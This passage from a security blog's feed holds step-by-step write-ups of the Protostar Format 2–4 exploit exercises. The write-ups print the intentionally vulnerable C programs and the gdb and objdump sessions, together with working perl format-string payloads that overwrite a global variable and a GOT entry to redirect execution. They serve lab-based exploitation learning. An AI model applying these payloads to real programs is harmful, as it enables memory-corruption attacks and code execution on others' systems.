      <guid>https://www.mattandreko.com/blog/2012-02-02-exploit-exercises-protostar-format-4/</guid>
      <description>&lt;p&gt;Next up is the last challenge in the Format String series, &lt;a href=&#34;http://exploit-exercises.com/protostar/format4&#34;&gt;Format 4&lt;/a&gt;.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;It starts out with the following code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int target;

void hello()
{
 printf(&amp;quot;code execution redirected! you win\n&amp;quot;);
 _exit(1);
}

void vuln()
{
 char buffer[512];

 fgets(buffer, sizeof(buffer), stdin);

 printf(buffer);

 exit(1); 
}

int main(int argc, char **argv)
{
 vuln();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What initially caught my eye was the fact that there was a call to &amp;ldquo;exit()&amp;rdquo; as well as &amp;ldquo;_exit()&amp;ldquo;.  This made me think back to my reading, and I realized it was going to be a GOT (Global Offset Table) overwrite on &amp;ldquo;exit()&amp;rdquo;.  When the program runs for the first time, the GOT is initialized to 0x00000000 for every external function, such as libc functions.  The first time it runs that function, it will cache the memory address in the GOT, so that it doesn&amp;rsquo;t have to ask libc, or the corresponding library each time.  If we overwrite the GOT value, we can make it execute arbitrary code instead of that original function.  In this case, our victim is &amp;ldquo;exit()&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;For this exploit to work, we will need a few things:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Memory address of &amp;ldquo;exit()&amp;rdquo; in the GOT, which we want to overwrite&lt;/li&gt;
&lt;li&gt;Memory address of &amp;ldquo;hello()&amp;rdquo;, which will be the data we overwrite the GOT with&lt;/li&gt;
&lt;li&gt;Stack offset for the format string&lt;/li&gt;
&lt;li&gt;The amount of characters to buffer for each byte-pair&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Getting the memory address of the &amp;ldquo;exit()&amp;rdquo; method in the GOT is fairly easy:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -R format4

format4:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Getting the memory address of &amp;ldquo;hello()&amp;rdquo; is quite similar:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format4 | grep hello
080484b4 g     F .text  0000001e              hello
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To get the stack offset of the format string, it&amp;rsquo;s quite simple.  We&amp;rsquo;ve done it in prior challenges.  Let&amp;rsquo;s just spam &amp;ldquo;%x&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo AAAAAAAA`perl -e &#39;print &amp;quot;%x.&amp;quot;x15&#39;` | ./format4
AAAAAAAA200.b7fd8420.bffff624.41414141.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From this, we can now see &amp;ldquo;41414141&amp;rdquo; in the 4th stack variable, so our offset is 4.&lt;/p&gt;

&lt;p&gt;Using that offset of 4, we can now generate a format string using Direct Parameter Access, which I&amp;rsquo;ve only slightly mentioned in previous posts. I chose to dump the string to a file, because it made it really easy to use with gdb.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;\x24\x97\x04\x08&amp;quot;.&amp;quot;\x25\x97\x04\x08&amp;quot;.&amp;quot;\x26\x97\x04\x08&amp;quot;.&amp;quot;\x27\x97\x04\x08&amp;quot;.&amp;quot;%4\$n&amp;quot;&#39; &amp;gt; /home/user/format4_dpa
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, if we run it in gdb, we can see how many characters are being written to &amp;ldquo;printf&amp;rdquo; initially, and adjust our buffering to compensate.  Start up the gdb debugger, and disassemble the &amp;ldquo;vuln&amp;rdquo; function.  We do this, so we can set a breakpoint right before &amp;ldquo;exit()&amp;rdquo; gets called.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb --quiet ./format4
Reading symbols from /opt/protostar/bin/format4...done.
(gdb) disassemble vuln
Dump of assembler code for function vuln:
0x080484d2 &amp;lt;vuln+0&amp;gt;:    push   %ebp
0x080484d3 &amp;lt;vuln+1&amp;gt;:    mov    %esp,%ebp
0x080484d5 &amp;lt;vuln+3&amp;gt;:    sub    $0x218,%esp
0x080484db &amp;lt;vuln+9&amp;gt;:    mov    0x8049730,%eax
0x080484e0 &amp;lt;vuln+14&amp;gt;:   mov    %eax,0x8(%esp)
0x080484e4 &amp;lt;vuln+18&amp;gt;:   movl   $0x200,0x4(%esp)
0x080484ec &amp;lt;vuln+26&amp;gt;:   lea    -0x208(%ebp),%eax
0x080484f2 &amp;lt;vuln+32&amp;gt;:   mov    %eax,(%esp)
0x080484f5 &amp;lt;vuln+35&amp;gt;:   call   0x804839c &amp;lt;fgets@plt&amp;gt;
0x080484fa &amp;lt;vuln+40&amp;gt;:   lea    -0x208(%ebp),%eax
0x08048500 &amp;lt;vuln+46&amp;gt;:   mov    %eax,(%esp)
0x08048503 &amp;lt;vuln+49&amp;gt;:   call   0x80483cc &amp;lt;printf@plt&amp;gt;
0x08048508 &amp;lt;vuln+54&amp;gt;:   movl   $0x1,(%esp)
0x0804850f &amp;lt;vuln+61&amp;gt;:   call   0x80483ec &amp;lt;exit@plt&amp;gt;
End of assembler dump.
(gdb) b *vuln+61
Breakpoint 1 at 0x804850f: file format4/format4.c, line 22.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After the breakpoint has been set, go ahead and run the program, piping in the formatstring from the file we created earlier:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) run &amp;lt; /home/user/format4_dpa
Starting program: /opt/protostar/bin/format4 &amp;lt; /home/user/format4_dpa

Breakpoint 1, 0x0804850f in vuln () at format4/format4.c:22
22      format4/format4.c: No such file or directory.
        in format4/format4.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What we need to do, is examine the address of the GOT space for the &amp;ldquo;exit()&amp;rdquo; method, and now see what was set.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) x/1x 0x08049724
0x8049724 &amp;lt;_GLOBAL_OFFSET_TABLE_+36&amp;gt;:   0x00000010
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Good, so far we know: &lt;ul&gt;&lt;li&gt;GOT address to overwrite: 0x8049724&lt;/li&gt;&lt;li&gt;Value to overwrite it with: 0x080484b4&lt;/li&gt;&lt;/ul&gt;
We can use this data to now calculate all of the individual buffer sizes needed to get the right number of characters output by &amp;ldquo;printf&amp;rdquo;.  This little trick was learned from reading &lt;a href=&#34;http://www.amazon.com/gp/product/1593271441/ref=as_li_ss_tl?ie=UTF8&amp;amp;tag=mattandcom-20&amp;amp;linkCode=as2&amp;amp;camp=1789&amp;amp;creative=390957&amp;amp;creativeASIN=1593271441&#34;&gt;Hacking: The Art of Exploitation, 2nd Edition&lt;/a&gt;&lt;img src=&#34;http://www.assoc-amazon.com/e/ir?t=mattandcom-20&amp;l=as2&amp;o=1&amp;a=1593271441&#34; width=&#34;1&#34; height=&#34;1&#34; border=&#34;0&#34; alt=&#34;&#34; style=&#34;border:none !important; margin:0px !important;&#34; /&gt;, which I highly recommend.  Without this book, I would have been stuck on these format string levels for a lot longer than I was. I just needed a little bump, and it gave it to me.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb -q
(gdb) p 0xb4 - 0x00000010
$1 = 164
(gdb) p 0x84 - 0xb4
$2 = -48
(gdb) p 0x184 - 0xb4
$3 = 208
(gdb) p 0x04 - 0x84
$4 = -128
(gdb) p 0x104 - 0x84
$5 = 128
(gdb) p 0x08 - 0x04
$6 = 4
(gdb) p 0x108 - 0x04
$7 = 260
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To explain this, you take the address you want to overwrite with (0x080484b4 in our case) and split it up into the byte pairs in little endian order (b4, 84, 08, 08).  Starting with the first one (b4), you subtract the base number we saw get written before (0x00000010), and that will give us the first buffer length of 164.  For the second one, take the 2nd byte pair (84) and subtract the first byte pair (b4).  In this case, we went negative, so we add a &amp;ldquo;1&amp;rdquo; in the most significant digit of the first number, making ours &amp;ldquo;184&amp;rdquo;.  We then subtract again, and get 208.  You do this for all 4 pairs, and you get your offsets of 164, 208, 128, 260.&lt;/p&gt;

&lt;p&gt;Now that we have our buffer sizes, let&amp;rsquo;s construct the format string with them:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;\x24\x97\x04\x08&amp;quot;.&amp;quot;\x25\x97\x04\x08&amp;quot;.&amp;quot;\x26\x97\x04\x08&amp;quot;.&amp;quot;\x27\x97\x04\x08&amp;quot;.&amp;quot;%164x%4\$n&amp;quot;.&amp;quot;%208x%5\$n&amp;quot;.&amp;quot;%128x%6\$n&amp;quot;.&amp;quot;%260x%7\$n&amp;quot;&#39; &amp;gt; /home/user/format4_dpa
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lastly, we run the format4 program with the format4_dpa file as the input:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format4 &amp;lt; /home/user/format4_dpa           $%&amp;amp;&#39;                                                              

                                                                                                   200                                            

                                                                                                                                                  

          b7fd8420                                                                                                                        

bffff624                                                                                                                                          

                                                                                                                   8049724code execution 

redirected! you win
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And that&amp;rsquo;s a win!&lt;/p&gt;

&lt;p&gt;I learned a lot of things in this section of the Protostar challenge.  I had almost no experience with format string exploitation, but now I&amp;rsquo;m feeling pretty comfortable with them.  We&amp;rsquo;ll have to see about the &lt;a href=&#34;http://exploit-exercises.com/protostar/final1&#34;&gt;Final 1&lt;/a&gt; level.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Format 3</title>
      <link>https://www.mattandreko.com/blog/2012-02-01-exploit-exercises-protostar-format-3/</link>
      <pubDate>Wed, 01 Feb 2012 05:33:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-02-01-exploit-exercises-protostar-format-3/</guid>
      <description>&lt;p&gt;Continuing in the String Format section, the next challenge we run across is &lt;a href=&#34;http://exploit-exercises.com/protostar/format3&#34;&gt;Format 3&lt;/a&gt;.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;We&amp;rsquo;re first given the following code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int target;

void printbuffer(char *string)
{
 printf(string);
}

void vuln()
{
 char buffer[512];

 fgets(buffer, sizeof(buffer), stdin);

 printbuffer(buffer);

 if(target == 0x01025544) {
  printf(&amp;quot;you have modified the target :)\n&amp;quot;);
 } else {
  printf(&amp;quot;target is %08x :(\n&amp;quot;, target);
 }
}

int main(int argc, char **argv)
{
 vuln();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This seems to be just like Format 2, except that we have to modify all 8 bytes instead of just 2.&lt;/p&gt;

&lt;p&gt;The process is still pretty much the same.  We will first find the memory address of &amp;ldquo;target&amp;rdquo;, to get that out of the way:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format3 | grep target
080496f4 g     O .bss   00000004              target
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I tried spamming the format3 executable with 15 &amp;ldquo;%x&amp;rdquo;, since the last couple challenges have been lower than the typical 150 I was doing.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo AAAA`perl -e &#39;print &amp;quot;%x.&amp;quot;x15&#39;` | ./format3
AAAA0.bffff5e0.b7fd7ff4.0.0.bffff7e8.804849d.bffff5e0.200.b7fd8420.bffff624.41414141.252e7825.78252e78.2e78252e.
target is 00000000 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It appears that we get our &amp;ldquo;41414141&amp;rdquo; at 12 bytes popped.  Let&amp;rsquo;s verify:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo AAAA%x%x%x%x%x%x%x%x%x%x%x%x | ./format3
AAAA0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff62441414141
target is 00000000 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So let&amp;rsquo;s try it with the memory address of &amp;ldquo;target&amp;rdquo; instead of &amp;ldquo;AAAA&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%x%n&amp;quot;&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624
target is 00000041 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome! It&amp;rsquo;s overwriting properly.  Our last byte shows as &amp;ldquo;41&amp;rdquo;, meaning that printf wrote 41 characters.  However for the vulnerable program, it needs to be &amp;ldquo;44&amp;rdquo;, so let&amp;rsquo;s just increase it a little.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%n&amp;quot;&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624
target is 00000044 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So it appears if I use &amp;ldquo;%11x&amp;rdquo; for one of the stack pops, it&amp;rsquo;s just the right amount.  You can actually calculate this value using a calculator, but I&amp;rsquo;ve found myself usually just brute forcing it with multiple guesses.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s work on the next 2 bytes. From several of the books and papers listed in the previous challenge, I found out how to handle this. You just start appending more data, with a junk buffer, and possibly some spacing, and it will continue in a similar fashion. You then just increment the byte you want to overwrite, going upwards in the memory space, so you don&amp;rsquo;t overwrite the space you already wrote the first time.&lt;/p&gt;

&lt;p&gt;To feel out for how many stack pops we&amp;rsquo;d have to do, I experimented, and spammed an additional 15 after setting up the start of the next byte of &amp;ldquo;target&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKAAAAAAAA\xf5\x96\x04\x08&amp;quot; . &amp;quot;%x.&amp;quot;x15&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKAAAAAAAA78257825.78257825.78257825.78257825.78257825.78313125.554a6e25.41414b4e.41414141.96f54141.78250804.2e78252e.252e7825.78252e78.2e78252e.
target is 00000044 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now pay attention here. You&amp;rsquo;ll see after 8 stack pops, you have &amp;ldquo;41414b4e.41414141&amp;rdquo;.  The first byte has some junk from a previous memory address. Since we can only pass 4 &amp;ldquo;A&amp;rdquo;s, we&amp;rsquo;ll need to buffer this a bit with additional junk bytes. To test that out, we can do:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJUAAAA\xf5\x96\x04\x08%x%x%x%x%x%x%x%x%x&amp;quot;&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJUAAAA782578257825782578257825782578257825782578313125554a6e25554a4b4e41414141
target is 00000044 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now if we just convert that final &amp;ldquo;%x&amp;rdquo; to a &amp;ldquo;%n&amp;rdquo;, we&amp;rsquo;ll overwrite the second memory address shown with the number of bytes printed.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%x%n&amp;quot;&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4e
target is 00008e44 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome again! We overwrote the next 2 bytes!  But wait a minute.  It overwrote &amp;ldquo;8e&amp;rdquo;, and we want to get &amp;ldquo;55&amp;rdquo;.  There is nothing that we can add to &amp;ldquo;8e&amp;rdquo; to get &amp;ldquo;55&amp;rdquo;, as it&amp;rsquo;s larger.  We can&amp;rsquo;t subtract, so this poses an issue.  However, there&amp;rsquo;s nothing saying that we can&amp;rsquo;t overwrite 4 bytes instead of just 2.  We could simply add to &amp;ldquo;8e&amp;rdquo; until we get &amp;ldquo;255&amp;rdquo;, since the next 4 bytes needed are &amp;ldquo;0255&amp;rdquo;.  I played around with some math, and found that I could do exactly that!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%463x%n&amp;quot;&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4e
target is 00025544 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is convenient for us, because now we don&amp;rsquo;t have to do 4 separate overwrites, we can skip the third one, moving directly to the fourth.  For this last pair, we will need to write &amp;ldquo;01&amp;rdquo;.  Off the bat, with such a low number, I knew that we&amp;rsquo;d have to do something similar, since there&amp;rsquo;s no way we would ever be writing 0 characters in printf.  We would just have to raise it to &amp;ldquo;101&amp;rdquo;, and the first &amp;ldquo;1&amp;rdquo; would get cut off into a virtual la-la land.&lt;/p&gt;

&lt;p&gt;Again, let&amp;rsquo;s find the length of stack addresses to pop, by spamming 15 &amp;ldquo;%x&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%463x%nJUNKAAAA&amp;quot; . &amp;quot;%x.&amp;quot;x15&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4eJUNKAAAA78257825.78257825.78257825.34257825.25783336.4e554a6e.4141414b.2e782541.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
target is 00025544 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This time we have 7 pops, and again the buffer is mis-aligned.  So let&amp;rsquo;s test the 7 pops and fixing the buffer alignment:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%463x%nJUNAAAA%x%x%x%x%x%x%x&amp;quot;&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4eJUNAAAA78257825782578257825782534257825257833364e554a6e41414141
target is 00025544 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Removing one character from the 4-char word &amp;ldquo;JUNK&amp;rdquo; seemed to do the trick.  We are now showing &amp;ldquo;41414141&amp;rdquo; as the last word again.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s switch the last &amp;ldquo;%x&amp;rdquo; to &amp;ldquo;%n&amp;rdquo;, and the &amp;ldquo;AAAA&amp;rdquo; to our last memory address, and see what it outputs.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%463x%nJUN\xf7\x96\x04\x08%x%x%x%x%x%x%n&amp;quot;&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4eJUN78257825782578257825782534257825257833364e554a6e
target is 8c025544 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Alright, so it&amp;rsquo;s giving &amp;ldquo;8c&amp;rdquo;, and we need to get to &amp;ldquo;101&amp;rdquo;.  That&amp;rsquo;s roughly 117 bytes difference.  I started tinkering from there, and found that it needed 125 extra characters.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%463x%nJUN\xf7\x96\x04\x08%x%x%x%x%x%125x%n&amp;quot;&#39;` | ./format3
0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4eJUN78257825782578257825782534257825257833364e554a6e
you have modified the target :)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome! We actually were able to overwrite an arbitrary value in memory to a specific value of our desire.  Think of the implications of this.  I was solving it, and afterwards read about a very new string format vulnerability in &amp;ldquo;sudo&amp;rdquo;.  More information can be read &lt;a href=&#34;http://www.sudo.ws/sudo/alerts/sudo_debug.html&#34;&gt;here&lt;/a&gt;.  These are real-world applications, and these bugs are found in the wild.  It really blows my mind.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Format 2</title>
      <link>https://www.mattandreko.com/blog/2012-01-31-exploit-exercises-protostar-format-2/</link>
      <pubDate>Tue, 31 Jan 2012 05:13:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-01-31-exploit-exercises-protostar-format-2/</guid>
      <description>&lt;p&gt;Continuing from where we left off, we arrive at &lt;a href=&#34;http://exploit-exercises.com/protostar/format2&#34;&gt;Format 2&lt;/a&gt;.  It presents us with the following code:&lt;/p&gt;

&lt;!-- more --&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int target;

void vuln()
{
 char buffer[512];

 fgets(buffer, sizeof(buffer), stdin);
 printf(buffer);

 if(target == 64) {
  printf(&amp;quot;you have modified the target :)\n&amp;quot;);
 } else {
  printf(&amp;quot;target is %d :(\n&amp;quot;, target);
 }
}

int main(int argc, char **argv)
{
 vuln();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This challenge seems very similar to Format 1, in all but 2 ways:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;The input is done via a fgets() instead of from the program arguments.&lt;/li&gt;
&lt;li&gt;Instead of allowing just any change, it specifically requires &amp;ldquo;target&amp;rdquo; to be equal to &amp;ldquo;64&amp;rdquo;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;We&amp;rsquo;ll start pretty much the same way as last time, spamming &amp;ldquo;%x&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;AAAAAAAA&amp;quot; . &amp;quot;%x.&amp;quot;x150&#39;` | ./format2
AAAAAAAA200.b7fd8420.bffff624.41414141.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.a2e78.b7eada75.b7fd7ff4.80496b0.bffff7c8.8048338.b7ff1040.80496b0.bffff7f8.80484f9.b7fd8304.b7fd7ff4.80484e0.bffff7f8.b7ec6365.b7ff1040.bffff7f8.80484c6.80484e0.0.bffff878.b7eadc76.1.bffff8a4.bffff8ac.b7fe1848.bffff860.ffffffff.b7ffeff4.8048285.1.bffff860.b7ff0626.
target is 0 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This time, however, it seemed MUCH quicker to get the &amp;ldquo;41414141&amp;rdquo;, only 4 words.  Let&amp;rsquo;s verify:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format2
AAAA%x%x%x%x
AAAA200b7fd8420bffff62441414141
target is 0 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we&amp;rsquo;re getting to a pretty good point, let&amp;rsquo;s go ahead and find the memory address for &amp;ldquo;target&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format2 | grep target
080496e4 g     O .bss   00000004              target
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, let&amp;rsquo;s put that address in, replacing the &amp;ldquo;AAAA&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xe4\x96\x04\x08%x%x%x%x&amp;quot;&#39;` | ./format2
200b7fd8420bffff62480496e4
target is 0 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The address seems to be the last word, without any problems.  So if we convert the last &amp;ldquo;%x&amp;rdquo; to &amp;ldquo;%n&amp;rdquo;, it should overwrite that address in memory with the count of characters printed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xe4\x96\x04\x08%x%x%x%n&amp;quot;&#39;` | ./format2
200b7fd8420bffff624
target is 23 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Unfortunately, only 23 characters were written.  We can increase that number artificially by just changing the format string from &amp;ldquo;%x&amp;rdquo; to &amp;ldquo;%44x&amp;rdquo;.  This pads the string to be 44 characters long:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xe4\x96\x04\x08%44x%x%x%n&amp;quot;&#39;` | ./format2
                                         200b7fd8420bffff624
you have modified the target :)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&amp;rsquo;s pretty much how it&amp;rsquo;s done.&lt;/p&gt;

&lt;p&gt;And again, as bonus, if you want to use Direct Argument Access, you can simply do:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xe4\x96\x04\x08%7\\\$60x%4\\\$n&amp;quot;&#39;` | ./format2
                                                       a6e24
you have modified the target :)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Format 1</title>
      <link>https://www.mattandreko.com/blog/2012-01-30-exploit-exercises-protostar-format-1/</link>
      <pubDate>Mon, 30 Jan 2012 18:12:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-01-30-exploit-exercises-protostar-format-1/</guid>
      <description>&lt;p&gt;Following the Format 0 challenge, I&amp;rsquo;ve had to do a bunch of reading on how format string exploits work on a very low level.&lt;/p&gt;

